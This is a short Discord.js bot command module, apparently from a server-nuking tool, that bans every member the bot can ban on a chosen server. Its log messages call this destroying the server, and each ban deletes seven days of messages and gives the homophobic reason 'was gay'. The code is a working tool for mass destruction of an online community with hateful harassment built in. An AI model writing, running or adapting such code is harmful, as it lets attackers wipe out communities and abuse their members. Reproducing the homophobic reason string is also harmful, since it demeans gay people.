let discord = require("discord.js")
let fs = require("fs")
module.exports = {
    triggers: ["banall","ball","perish"],
    description: "Bans all members that the bot is able to ban.",
    run(client = new discord.Client(), args, starget, ctarget) {
        if (!ctarget) return console.log("Please select a server to destroy.")
        if (!client.guilds.resolve(ctarget)) return console.log("The guild the cannon was aimed to is invalid. Did the bot get removed from the server or did you manipulate the files?")
        client.guilds.resolve(ctarget).members.cache.filter(a => a.bannable).forEach(b => {
            console.log("Attempting to ban "+b.user.username)
            b.ban({days:7,reason:"was gay"})
        })
    }
}